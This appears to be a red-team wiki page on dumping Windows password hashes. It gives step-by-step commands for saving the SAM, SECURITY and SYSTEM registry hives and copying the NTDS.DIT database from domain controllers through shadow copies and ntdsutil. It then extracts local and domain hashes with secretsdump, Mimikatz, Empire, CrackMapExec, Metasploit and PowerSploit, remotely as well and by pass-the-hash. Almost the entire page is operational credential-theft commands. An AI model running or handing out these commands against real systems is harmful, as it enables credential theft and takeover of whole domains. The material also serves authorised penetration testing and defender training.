# How-To efficiently dump hashes
In order to dump the hashes of a system, you'll obviously need administrator privileges!

There are two families of hashes:
* hashes of local user accounts. They are stored within the SAM database of a system;
* hashes of domain user accounts. They are stored within the NTDS.DIT database of a Domain Controller. They can also be found in memory within the LSASS process.

Hashes are not stored in cleartext within the SAM or NTDS.DIT databases. They are encrypted with a BootKey stored within the SYSTEM hive.
By pulling the various hives (SAM, SYSTEM, SECURITY or NTDS.DIT) from a targeted system into your attacker's laptop, it is possible to perform an offline attack and extract these local or domain user account's hashes.

They can be used to perform [pass-the-hash attacks](Pass-the-hash.md) or password cracking to obtain plaintext passwords.

However, online attacks are also possible with tools like *CrackMapExec*, *Mimikatz*, *Impacket's secretsdump*...

## Pulling the hives
You will have to copy these hives on your attacker's system in order to dump the hashes.
You can perform the following techniques locally (from a cmd / Powershell prompt) or remotely thanks to [this guide](LateralMovement.md).

### Server or workstation (SAM / SYSTEM / SECURITY)
```
> reg save HKLM\SAM sam.hive
> reg save HKLM\SECURITY security.hive
> reg save HKLM\SYSTEM system.hive
```

### Active Directory (NTDS.DIT / SYSTEM)
No change for the system hive dumping:
```
> reg save HKLM\SYSTEM system.hive
```

However, copy NTDS.DIT requires different methods:
0. Check the location of the NTDS.DIT file from the *DSA Database file* parameter:
```
> reg query HKLM\System\CurrentControlSet\Services\NTDS\Parameters
```

1. VSS shadow copy:
> vssadmin.exe is natively present on the DC. In this example we will suppose that NTDS.DIT is present in C:\Windows\NTDS\NTDS.DIT.
Please adapt it for your need...

* Create a volume shadow copy of C:
```
> vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: <volume_guid>
    Shadow Copy Volume Name: <volume_name>
```
> The <volume_name> usually looks like **\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8**

* Copy the NTDS.DIT from the new volume shadow copy
```
> copy <volume_name>\windows\ntds\ntds.dit <where_to_copy>
```

* Delete the previously created volume shadow copy:
```
> vssadmin delete shadows /shadow=<volume_guid>
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Do you really want to delete 1 shadow copies (Y/N): [N]? y

Successfully deleted 1 shadow copies.
```

2. NTDSUTIL's IFM creation:
> ntdsutil.exe is natively present on the DC
```
> ntdsutil "ac i ntds" "ifm" "create full <where_to_copy>" q q
```

3. [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1):
```
> Invoke-NinjaCopy -Path <ntds.dit> -ComputerName <dc_fqdn> -LocalDestination <where_to_copy>
```

## Dumping hashes
### With [Impacket](https://github.com/CoreSecurity/impacket/)'s [secretsdump](https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py)
> Windows version: https://github.com/maaaaz/impacket-examples-windows/blob/master/secretsdump.exe

#### Local user accounts (server or workstation)
1. Offline (with the hives):
```
$ python secretsdump.py -sam <sam.hive> -security <security.hive> -system <system.hive> LOCAL
```

2. Online (without the hives):
* With administrator credentials:
```
$ python secretsdump.py [<domain>/]<username>:<password>@<server_fqdn>
```

* By PtH (NTLM hash of an administrator account):
```
$ python secretsdump.py -hashes <LM>:<NTLM> [<domain>/]<username>@<server_fqdn>
```

#### Domain user accounts
1. Offline (with the hives):
```
python secretsdump.py -ntds <ntds.dit> -system <system.hive> LOCAL
```

2. Online (without the hives):
```
$ python secretsdump.py [<domain>/]<username>[:<password> | -hashes <LM>:<NTLM>]@<dc_fqdn>
```

### With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
#### Local user accounts (server or workstation)
1. Offline (with the hives):
```
mimikatz # lsadump::sam /system:<system.hive> /sam:<sam.hive>
```

2. Online (without the hives):
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

#### Domain user accounts
1. From a server or workstation:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

2. From a Domain Controller:
* LM/NTLM hashes only:
```
mimikatz # lsadump::lsa /patch
```

* LM/NTLM hashes + [supplementalCredentials](https://msdn.microsoft.com/de-de/library/cc245674.aspx) like WDigest and Kerberos hashes:
```
mimikatz # lsadump::lsa /inject
```

### With Empire
#### Local user accounts (server or workstation)
```
usemodule credentials/powerdump
```

#### Domain user accounts
1. From a server or workstation:
```
(Empire: <agent_name>) > mimikatz
```
> Equivalent to *usemodule credentials/mimikatz/logonpasswords*

2. From a Domain Controller:
```
usemodule credentials/mimikatz/lsadump
```

### With CrackMapExec
#### Local user accounts (server or workstation)
1. SAM:
```
#~ crackmapexec <proto> <target(s)> [-d <domain>] -u <user> [-p <password> | -H <NTLM>] --sam
```

2. LSA secrets:
```
#~ crackmapexec <proto> <target(s)> [-d <domain>] -u <user> [-p <password> | -H <NTLM>] --lsa
```

#### Domain user accounts
1. From a server or workstation:
```
#~ crackmapexec <proto> <target(s)> [-d <domain>] -u <user> [-p <password> | -H <NTLM>] -M mimikatz
```

2. From a Domain Controller:
```
#~ crackmapexec <proto> <target(s)> [-d <domain>] -u <user> [-p <password> | -H <NTLM>] --ntds
```

### With Metasploit
You have previously pwn a system and have a meterpreter session. You'll use post-exploitation modules so you have to background your meterpreter session:
```
meterpreter> background
```

#### Local user accounts (server or workstation)
```
msf > use post/windows/gather/smart_hashdump
msf post(smart_hashdump) > set session 1
msf post(smart_hashdump) > exploit
```

#### Domain user accounts
1. From a server or workstation:
```
meterpreter > load kiwi
meterpreter > creds_all
```

2. From a Domain Controller:
```
msf > use post/windows/gather/smart_hashdump
msf post(smart_hashdump) > set session 1
msf post(smart_hashdump) > exploit
```

### With [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1):
See the Mimikatz part above and apply it within the Command argument of Invoke-Mimikatz.ps1. Example:
```
> Invoke-Mimikatz -Command '"privilege::debug" "lsadump::lsa /inject" exit' -Computer <dc_fqdn>
```
> Hints: Put the whole command sequence between single quotes and each command between double quotes and don't forget to exit!!
